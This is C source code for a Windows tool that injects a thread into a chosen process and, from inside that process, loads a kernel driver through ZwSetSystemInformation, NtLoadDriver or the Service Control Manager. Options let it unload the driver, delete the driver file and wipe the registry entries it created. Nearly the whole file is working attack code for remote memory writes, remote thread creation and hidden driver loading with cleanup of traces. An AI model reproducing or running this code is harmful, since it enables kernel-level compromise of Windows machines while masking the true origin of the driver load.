//#######################################################//
//====================== Remote shit ====================//
//#######################################################//
GtkWidget *inject_with_rtl_check_box, *inject_with_crt_check_box;

typedef VOID (NTAPI *Rm_RtlInitUnicodeString)(PUNICODE_STRING DestinationString,PCWSTR SourceString);
typedef LONG (__stdcall *Rm_RtlAdjustPrivilege)(int,BOOL,BOOL,BOOL *);
typedef NTSTATUS (NTAPI *Rm_ZwSetSystemInformation)(DWORD, PVOID, ULONG);
typedef NTSTATUS (NTAPI *Rm_NtTerminateThread)(HANDLE ThreadHandle,NTSTATUS ExitStatus);
typedef NTSTATUS (NTAPI *Rm_NtLoadDriver)( IN PUNICODE_STRING DriverServiceName );
typedef NTSTATUS (NTAPI *Rm_NtUnloadDriver)( IN PUNICODE_STRING DriverServiceName );
typedef LONG (WINAPI *Rm_RegSetValueEx)(HKEY hKey, LPCTSTR lpValueName, DWORD Reserved,
										DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG (WINAPI *Rm_RegCreateKey)(HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *Rm_RegCloseKey)( HKEY hKey);
typedef BOOL (WINAPI *Rm_DeleteFile)( LPCTSTR lpFileName);
typedef DWORD (WINAPI *Rm_SHDeleteKey)(HKEY hkey, LPCTSTR pszSubKey);
typedef SC_HANDLE (WINAPI *Rm_OpenSCManager)( LPCTSTR lpMachineName,
										LPCTSTR lpDatabaseName, DWORD dwDesiredAccess);
typedef SC_HANDLE (WINAPI *Rm_CreateService)( SC_HANDLE hSCManager, LPCTSTR lpServiceName,
										LPCTSTR lpDisplayName, DWORD dwDesiredAccess,
										DWORD dwServiceType, DWORD dwStartType,
										DWORD dwErrorControl, LPCTSTR lpBinaryPathName,
										LPCTSTR lpLoadOrderGroup, LPDWORD lpdwTagId,
										LPCTSTR lpDependencies, LPCTSTR lpServiceStartName,
										LPCTSTR lpPassword);
typedef SC_HANDLE (WINAPI *Rm_OpenService)( SC_HANDLE hSCManager, LPCTSTR lpServiceName,
															DWORD dwDesiredAccess);
typedef BOOL (WINAPI *Rm_StartService)( SC_HANDLE hService, DWORD dwNumServiceArgs,
									LPCTSTR *lpServiceArgVectors);
typedef BOOL (WINAPI *Rm_CloseServiceHandle)( SC_HANDLE hSCObject);
typedef BOOL (WINAPI *Rm_ControlService)( SC_HANDLE hService, DWORD dwControl,
											LPSERVICE_STATUS lpServiceStatus);
typedef BOOL (WINAPI *Rm_DeleteService)( SC_HANDLE hService);
typedef DWORD (WINAPI *Rm_MessageBoxA)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
typedef DWORD (WINAPI *Rm_MessageBoxW)(HWND hWnd, WCHAR *lpText, WCHAR *lpCaption, UINT uType);
typedef int (NTAPI *Rm_swprintf)(WCHAR*, const WCHAR *, ...);
typedef VOID (__stdcall *Rm_RtlZeroMemory)(VOID UNALIGNED  *Destination, SIZE_T Length);
typedef SIZE_T (__stdcall *Rm_Strlen)(const char *string);

typedef struct _Structure {
wchar_t Driver_Path[MAX_PATH];
int Mode;
BOOL UnloadDriver;
BOOL DeleteDriver;
BOOL DelRegValue;
BOOL SomeShit;
SYSTEM_LOAD_AND_CALL_IMAGE img;
ADJUST_PRIVILEGE_TYPE AdjustCurrentProcess;
SIZE_T BombSize;
PVOID RmRtlInitUnicodeString;
PVOID RmRtlZeroMemory;
PVOID RmRtlAdjustPrivilege;
PVOID RmZwSetSystemInformation;
PVOID RmNtTerminateThread;
PVOID RmNtLoadDriver;
PVOID RmNtUnloadDriver;
PVOID RmRegSetValueEx;
PVOID RmRegCreateKey;
PVOID RmRegCloseKey;
PVOID RmSHDeleteKey;
PVOID RmDeleteFile;
PVOID RmStrlen;

UNICODE_STRING u_str;
char ImagePathValue[MAX_PATH];
char TypeValue[MAX_PATH];
DWORD Type;
char ImagePath[MAX_PATH];
char RegPath[MAX_PATH];
WCHAR RegUniPath[MAX_PATH];
HKEY hk;
//=============== Service Control Manager stuff ================//
PVOID RmOpenSCManager;
PVOID RmCreateService;
PVOID RmOpenService;
PVOID RmStartService;
PVOID RmCloseServiceHandle;
PVOID RmControlService;
PVOID RmDeleteService;
SC_HANDLE ServiceHandle;
SC_HANDLE ServiceHandleEx;
char ServiceName[MAX_PATH];
char DriverPath[MAX_PATH];
SERVICE_STATUS status;
//===============###############################================//
char debug[MAX_PATH];
char zw_debug[MAX_PATH];
char nt_debug[MAX_PATH];
char sc_debug[MAX_PATH];
char temp[MAX_PATH];
char err_debug[MAX_PATH];
WCHAR lulz[MAX_PATH];
WCHAR shit[50];
PVOID RmMessageBoxA;
PVOID RmMessageBoxW;
PVOID Rmswprintf;
NTSTATUS Status;
//=================================================================//
// some debug messages
char nt_reg_failed[MAX_PATH];
char nt_unload_failed[MAX_PATH];
char nt_delete_failed[MAX_PATH];
char nt_regdel_failed[MAX_PATH];
} Structure;

Structure my_Structure,*pmy_Structure;

DWORD ReThread(Structure *Parameter){
Rm_NtTerminateThread myNtTerminateThread = (Rm_NtTerminateThread)Parameter->RmNtTerminateThread;
Rm_RtlAdjustPrivilege myRtlAdjustPrivilege = (Rm_RtlAdjustPrivilege)Parameter->RmRtlAdjustPrivilege;
Rm_RtlInitUnicodeString myRtlInitUnicodeString = (Rm_RtlInitUnicodeString)Parameter->RmRtlInitUnicodeString;
Rm_DeleteFile myDeleteFile = (Rm_DeleteFile)Parameter->RmDeleteFile;
Rm_MessageBoxA myMessageBoxA = (Rm_MessageBoxA)Parameter->RmMessageBoxA;
Rm_MessageBoxW myMessageBoxW = (Rm_MessageBoxW)Parameter->RmMessageBoxW;
Rm_swprintf myswprintf = (Rm_swprintf)Parameter->Rmswprintf;
Rm_RtlZeroMemory myRtlZeroMemory = (Rm_RtlZeroMemory)Parameter->RmRtlZeroMemory;

//myMessageBoxA(0, Parameter->debug, Parameter->temp, MB_SERVICE_NOTIFICATION);

if(Parameter->Mode == ZWLOADMODE){

//myMessageBoxA(0, Parameter->zw_debug, Parameter->temp,0);

	Rm_ZwSetSystemInformation myZwSetSystemInformation = 
				(Rm_ZwSetSystemInformation)Parameter->RmZwSetSystemInformation;
	myRtlInitUnicodeString(&(Parameter->img.ModuleName), Parameter->Driver_Path);
	myRtlAdjustPrivilege(10, TRUE, Parameter->AdjustCurrentProcess, &Parameter->SomeShit);
	if(Parameter->Status = myZwSetSystemInformation(SystemLoadAndCallImage, &Parameter->img, Parameter->BombSize) != STATUS_SUCCESS){
                                                        myswprintf(Parameter->lulz, Parameter->shit, Parameter->Status);
                                                        myMessageBoxW(0, Parameter->lulz, NULL, MB_SERVICE_NOTIFICATION);
                                                        }

} else if(Parameter->Mode == SMLOADMODE){
       
//       myMessageBoxA(0, Parameter->sc_debug, Parameter->temp,0);

	Rm_OpenSCManager myOpenSCManager = (Rm_OpenSCManager)Parameter->RmOpenSCManager;
	Rm_CreateService myCreateService = (Rm_CreateService)Parameter->RmCreateService;
	Rm_OpenService myOpenService = (Rm_OpenService)Parameter->RmOpenService;
	Rm_StartService myStartService = (Rm_StartService)Parameter->RmStartService;
	Rm_CloseServiceHandle myCloseServiceHandle = (Rm_CloseServiceHandle)Parameter->RmCloseServiceHandle;
	Rm_ControlService myControlService = (Rm_ControlService)Parameter->RmControlService;
	Rm_DeleteService myDeleteService = (Rm_DeleteService)Parameter->RmDeleteService;

	Parameter->ServiceHandle = myOpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if (Parameter->ServiceHandle == NULL) {
		myNtTerminateThread(NtCurrentThread(), 0);
		return FALSE;
		}
		Parameter->ServiceHandleEx = myCreateService(Parameter->ServiceHandle, 
		Parameter->ServiceName, Parameter->ServiceName,  
		SERVICE_START | DELETE | SERVICE_STOP, SERVICE_KERNEL_DRIVER, 
		SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, Parameter->DriverPath, NULL, 
		NULL, NULL, NULL, NULL);
		if(Parameter->ServiceHandleEx == NULL){		
		Parameter->ServiceHandleEx = myOpenService(Parameter->ServiceHandle, Parameter->ServiceName, SERVICE_START | DELETE | SERVICE_STOP);
		if(Parameter->ServiceHandleEx == NULL)myNtTerminateThread(NtCurrentThread(), 0);
		}
		if (!myStartService(Parameter->ServiceHandleEx, 0, NULL))myNtTerminateThread(NtCurrentThread(), 0);
		myCloseServiceHandle(Parameter->ServiceHandle);
		myCloseServiceHandle(Parameter->ServiceHandleEx);
		if(Parameter->UnloadDriver == TRUE){
			Parameter->ServiceHandle = myOpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
			if (Parameter->ServiceHandle == NULL) myNtTerminateThread(NtCurrentThread(), 0);
			Parameter->ServiceHandleEx = myOpenService(Parameter->ServiceHandle, Parameter->ServiceName, SERVICE_START | DELETE | SERVICE_STOP);
			if(Parameter->ServiceHandleEx == NULL)	myNtTerminateThread(NtCurrentThread(), 0);
			myControlService(Parameter->ServiceHandleEx, SERVICE_CONTROL_STOP, &Parameter->status);
			myDeleteService(Parameter->ServiceHandleEx);
			myCloseServiceHandle(Parameter->ServiceHandleEx);
			myCloseServiceHandle(Parameter->ServiceHandle);
		}
		if(Parameter->DeleteDriver == TRUE)myDeleteFile(Parameter->DriverPath);


} else if(Parameter->Mode == NTLOADMODE){
       
  //     myMessageBoxA(0, Parameter->nt_debug, Parameter->temp,0);

	Rm_NtLoadDriver myNtLoadDriver = (Rm_NtLoadDriver)Parameter->RmNtLoadDriver;
	Rm_NtUnloadDriver myNtUnloadDriver = (Rm_NtUnloadDriver)Parameter->RmNtUnloadDriver;
	Rm_RegSetValueEx myRegSetValueEx = (Rm_RegSetValueEx)Parameter->RmRegSetValueEx;
	Rm_RegCreateKey myRegCreateKey = (Rm_RegCreateKey)Parameter->RmRegCreateKey;
	Rm_RegCloseKey myRegCloseKey = (Rm_RegCloseKey)Parameter->RmRegCloseKey;
	Rm_SHDeleteKey mySHDeleteKey = (Rm_SHDeleteKey)Parameter->RmSHDeleteKey;
	Rm_Strlen myStrlen = (Rm_Strlen)Parameter->RmStrlen;
    	
	myRtlInitUnicodeString(&Parameter->u_str, Parameter->RegUniPath);
//	myMessageBoxA(0, Parameter->RegPath, Parameter->temp,0);
//	myMessageBoxA(0, Parameter->ImagePath, Parameter->temp,0);
//	myMessageBoxW(0, Parameter->RegUniPath, NULL,0);
	
	if (myRegCreateKey(HKEY_LOCAL_MACHINE, Parameter->RegPath, &(Parameter->hk)) == STATUS_SUCCESS){
        if(myRegSetValueEx(Parameter->hk, Parameter->ImagePathValue, 0, REG_SZ, (LPBYTE)Parameter->ImagePath, myStrlen(Parameter->ImagePath)+1) != ERROR_SUCCESS) myNtTerminateThread(NtCurrentThread(), 0);                                  
        if(myRegSetValueEx(Parameter->hk, Parameter->TypeValue, 0, REG_DWORD, (LPBYTE)&Parameter->Type, sizeof(DWORD)) != ERROR_SUCCESS) myNtTerminateThread(NtCurrentThread(), 0); 
        if(myRegCloseKey(Parameter->hk) != ERROR_SUCCESS) myNtTerminateThread(NtCurrentThread(), 0);
        myRtlAdjustPrivilege(10, TRUE, Parameter->AdjustCurrentProcess, &(Parameter->SomeShit));
        if(Parameter->Status = myNtLoadDriver(&Parameter->u_str) != STATUS_SUCCESS){
                             myNtTerminateThread(NtCurrentThread(), 0);
                             }
        } else {
               myMessageBoxA(0, Parameter->nt_reg_failed, Parameter->temp,0);
               myNtTerminateThread(NtCurrentThread(), 0);
               }
        if(Parameter->UnloadDriver == TRUE){
                                   if(Parameter->Status = myNtUnloadDriver(&Parameter->u_str) != STATUS_SUCCESS){ 
                                                        myMessageBoxA(0, Parameter->nt_unload_failed, Parameter->temp,0);
                                                        myNtTerminateThread(NtCurrentThread(), 0);
                                                        }
                                   }
        if(Parameter->DeleteDriver == TRUE){
                                   if(myDeleteFile(Parameter->DriverPath) == 0){
                                                                          myMessageBoxA(0, Parameter->nt_delete_failed, Parameter->temp,0);
                                                                          myNtTerminateThread(NtCurrentThread(), 0);
                                                                          }
                                   }
        if(Parameter->DelRegValue == TRUE){
                                  if(mySHDeleteKey(HKEY_LOCAL_MACHINE, Parameter->RegPath) != ERROR_SUCCESS){
                                                                       myMessageBoxA(0, Parameter->nt_regdel_failed, Parameter->temp,0);
                                                                       myNtTerminateThread(NtCurrentThread(), 0);
                                                                       }
                                  }
}

myNtTerminateThread(NtCurrentThread(), 0);
return 0;
}


DWORD LoadDriverWithInjection(
							  char *TargProc, 
							  char *DriverPath, 
							  int LoadMode,
							  BOOL UnloadDriverMode,
							  BOOL DeleteDriverMode,
							  BOOL DelDrvRegMode
							  )
{
BOOL shit; OBJECT_ATTRIBUTES ObjectAttributes;
CLIENT_ID ClientId; NTSTATUS Status;
HANDLE hProcess; SIZE_T dwThreadSize=4000;
void *pThread; 
HINSTANCE hNtDll, hAdvapi, hShell, hKernel, hUser;
char container[MAX_PATH];
wchar_t targ_proc_wchar[MAX_PATH];
wchar_t driver_full_path[MAX_PATH] = L"\\??\\";
wchar_t file_name[MAX_PATH];
bool rtl_state, crt_state;

rtl_state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(inject_with_rtl_check_box));
crt_state = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(inject_with_crt_check_box));

MultiByteToWideChar(CP_ACP, 0, DriverPath, -1, file_name, sizeof(file_name));
MultiByteToWideChar(CP_ACP, 0, TargProc, -1, targ_proc_wchar, sizeof(targ_proc_wchar));
RtlZeroMemory(container, sizeof(container));
RtlAdjustPrivilege(20, TRUE, AdjustCurrentProcess, &shit);
InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
ClientId.UniqueProcess = (HANDLE)KeGetPID(targ_proc_wchar);
ClientId.UniqueThread = 0;
//sprintf(container, "%d", ClientId.UniqueProcess);
//MessageBox(0,container,"LOL",0);
Status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS  , &ObjectAttributes, &ClientId);
	if( !NT_SUCCESS( Status )){
	MessageBoxA(0, "Could not open target process!", "ERROR", MB_ICONERROR);
	return FALSE;
	}
pThread = NtVirtualAlloc(hProcess, 0, dwThreadSize, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
NtWriteVirtualMemory(hProcess, pThread, (void *)ReThread, dwThreadSize,0);
RtlZeroMemory(&my_Structure,sizeof(Structure));

hNtDll = LoadLibraryExA("ntdll.dll", NULL, 0);
hAdvapi = LoadLibraryExA("Advapi32.dll", NULL, 0);
hShell = LoadLibraryExA("shlwapi.dll", NULL, 0);
hKernel = LoadLibraryExA("Kernel32.dll", NULL, 0);
hUser = LoadLibraryExA("user32.dll", NULL, 0);

if(hNtDll == NULL || hAdvapi == NULL || hShell == NULL || hKernel == NULL || hUser == NULL){
          MessageBox(0, "Could not load needed dll's!\nInjection terminated!", "ERROR", MB_ICONERROR);
          return 0;
          }

wcscpy(my_Structure.Driver_Path, L"\\??\\");
wcscat(my_Structure.Driver_Path, file_name);
my_Structure.Mode = LoadMode;
my_Structure.UnloadDriver = UnloadDriverMode;
my_Structure.DeleteDriver = DeleteDriverMode;
my_Structure.DelRegValue = DelDrvRegMode;
my_Structure.RmNtTerminateThread = (void *)GetProcAddress(hNtDll, "NtTerminateThread");
my_Structure.RmRtlInitUnicodeString = (void *)GetProcAddress(hNtDll, "RtlInitUnicodeString");
my_Structure.RmRtlAdjustPrivilege = (void *)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
my_Structure.RmMessageBoxA = (void *) GetProcAddress(hUser, "MessageBoxA");
my_Structure.RmMessageBoxW = (void *) GetProcAddress(hUser, "MessageBoxW");
my_Structure.Rmswprintf =  (void *) GetProcAddress(hNtDll, "swprintf");
my_Structure.RmRtlZeroMemory =  (void *) GetProcAddress(hNtDll, "RtlZeroMemory");
my_Structure.RmDeleteFile = (void *)GetProcAddress(hKernel, "DeleteFileA");
if(!my_Structure.RmNtTerminateThread || !my_Structure.RmRtlInitUnicodeString ||
   !my_Structure.RmRtlAdjustPrivilege || !my_Structure.RmMessageBoxA ||
   !my_Structure.RmMessageBoxW || !my_Structure.Rmswprintf ||
   !my_Structure.RmRtlZeroMemory || !my_Structure.RmDeleteFile){
                                 MessageBox(0, "Failed to get procedure addresses of functions!\nInjection terminated!", "ERROR", MB_ICONERROR);
                                 return 0;
                                 }


strcpy(my_Structure.debug, "\nRemote thread created!\n");
strcpy(my_Structure.temp, "LOG");
strcpy(my_Structure.zw_debug, "\nUsing zwsetsysteminformation from remote process!\n");
strcpy(my_Structure.nt_debug, "\nUsing ntloaddriver from remote process!\n");
strcpy(my_Structure.sc_debug, "\nUsing service manager from remote process!\n");
strcpy(my_Structure.err_debug, "\nFailed to load driver from remote process!\n");
wcscpy(my_Structure.shit, L"Driver Loading Error!\nError code: 0x%08x");

char *name = PathFindFileName(DriverPath);

	if(LoadMode == ZWLOADMODE){ //==== if ZwSetSystemInformation ====//

	my_Structure.BombSize = sizeof(SYSTEM_LOAD_AND_CALL_IMAGE);
	my_Structure.UnloadDriver = FALSE;
	my_Structure.DeleteDriver = FALSE;
	my_Structure.DelRegValue = FALSE;
	my_Structure.RmZwSetSystemInformation = (void *)GetProcAddress(hNtDll, "ZwSetSystemInformation");
	if(!my_Structure.RmZwSetSystemInformation){
        MessageBox(0, "The fuck? Could not get ZwSetSystemInformation address!", "ERROR", MB_ICONERROR);
        return 0;
        }
	
	} else if (LoadMode == NTLOADMODE){ //==== if NtLoadDriver ====//

	my_Structure.RmNtLoadDriver = (void *)GetProcAddress(hNtDll, "NtLoadDriver");
	my_Structure.RmNtUnloadDriver = (void *)GetProcAddress(hNtDll, "NtUnloadDriver");
	my_Structure.RmRegSetValueEx = (void *)GetProcAddress(hAdvapi, "RegSetValueExA");
	my_Structure.RmRegCreateKey = (void *)GetProcAddress(hAdvapi, "RegCreateKeyA");
	my_Structure.RmRegCloseKey = (void *)GetProcAddress(hAdvapi, "RegCloseKey");
	my_Structure.RmSHDeleteKey = (void *)GetProcAddress(hShell, "SHDeleteKeyA");
	my_Structure.RmStrlen = (void *)GetProcAddress(hNtDll, "strlen");
	strcpy(my_Structure.nt_reg_failed, "NtLoadDriver failed!\nCould not create registry values!");
	strcpy(my_Structure.nt_unload_failed, "NtUnloadDriver Failed!");
	strcpy(my_Structure.nt_delete_failed, "Could not delete driver file!\nRemote thread terminated!");
	strcpy(my_Structure.nt_regdel_failed, "COuld not delete registry values!\nRemote thread terminated!");
	if(!my_Structure.RmNtLoadDriver || !my_Structure.RmNtUnloadDriver ||
       !my_Structure.RmRegSetValueEx || !my_Structure.RmRegCreateKey ||
       !my_Structure.RmRegCloseKey || !my_Structure.RmSHDeleteKey || !my_Structure.RmStrlen){
        sprintf(container, "Getting addresses of functions failed!\nInjection terminated!\n\nFunctions:\n\n\
NtLoadDriver: 0x%08x\nNtUnloadDriver: 0x%08x\n\
RegSetValueEx: 0x%08x\nRegCreateKey: 0x%08x\nRegCloseKey: 0x%08x\nSHDeleteKey: 0x%08x\nstrlen: 0x%08x", 
                           my_Structure.RmNtLoadDriver, my_Structure.RmNtUnloadDriver, my_Structure.RmRegSetValueEx,
                           my_Structure.RmRegCreateKey, my_Structure.RmRegCloseKey, my_Structure.RmSHDeleteKey, my_Structure.RmStrlen);
        MessageBox(0, container, "ERROR", MB_ICONERROR);
        return 0;
        }

	strcpy(my_Structure.ImagePathValue, "ImagePath");
	strcpy(my_Structure.TypeValue, "Type");
	my_Structure.Type = SERVICE_KERNEL_DRIVER;
    strcpy(my_Structure.ImagePath, "\\??\\");
    strcat(my_Structure.ImagePath, DriverPath);
    strcpy(my_Structure.RegPath, "SYSTEM\\CurrentControlSet\\Services\\");
    strcat(my_Structure.RegPath, name);
    wcscpy(my_Structure.RegUniPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\");
    MultiByteToWideChar(CP_ACP, 0, name, -1, file_name, sizeof(file_name));
    wcscat(my_Structure.RegUniPath, file_name);
    strcpy(my_Structure.DriverPath, DriverPath);
    
	} else if(LoadMode == SMLOADMODE){ //==== if Service Control Manager ====//

	my_Structure.DelRegValue = FALSE;

	my_Structure.RmOpenSCManager = (void *)GetProcAddress(hAdvapi, "OpenSCManagerA");
	my_Structure.RmCreateService = (void *)GetProcAddress(hAdvapi, "CreateServiceA");
	my_Structure.RmOpenService = (void *)GetProcAddress(hAdvapi, "OpenServiceA");
	my_Structure.RmStartService = (void *)GetProcAddress(hAdvapi, "StartServiceA");
	my_Structure.RmCloseServiceHandle = (void *)GetProcAddress(hAdvapi, "CloseServiceHandle");
	my_Structure.RmDeleteService = (void *)GetProcAddress(hAdvapi, "DeleteService");
	my_Structure.RmControlService = (void *)GetProcAddress(hAdvapi, "ControlService");
	if(!my_Structure.RmOpenSCManager || !my_Structure.RmCreateService ||
       !my_Structure.RmOpenService || !my_Structure.RmStartService ||
       !my_Structure.RmCloseServiceHandle || !my_Structure.RmDeleteService ||
       !my_Structure.RmControlService){
        MessageBox(0, "SMLOADMODE failed - could not get proc addr of function!\nInjection terminated!", "ERROR", MB_ICONERROR);
        return 0;
        }
	
	strcpy(my_Structure.DriverPath, DriverPath);
	strcpy(my_Structure.ServiceName, PathFindFileName(DriverPath));

	}

DWORD dwSize = sizeof(Structure);
pmy_Structure =(Structure *)NtVirtualAlloc (hProcess ,0,sizeof(Structure),MEM_COMMIT,PAGE_READWRITE);
NtWriteVirtualMemory(hProcess ,pmy_Structure,&my_Structure,sizeof(my_Structure),0);
if(rtl_state == TRUE){
RtlCreateUserThread(hProcess, NULL,FALSE, 0, 0, 0,(LPTHREAD_START_ROUTINE)pThread,(PVOID)pmy_Structure, 0, 0);
} else{
CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pThread, (PVOID)pmy_Structure, 0, NULL);
}
NtClose(hProcess);
return 0;
}
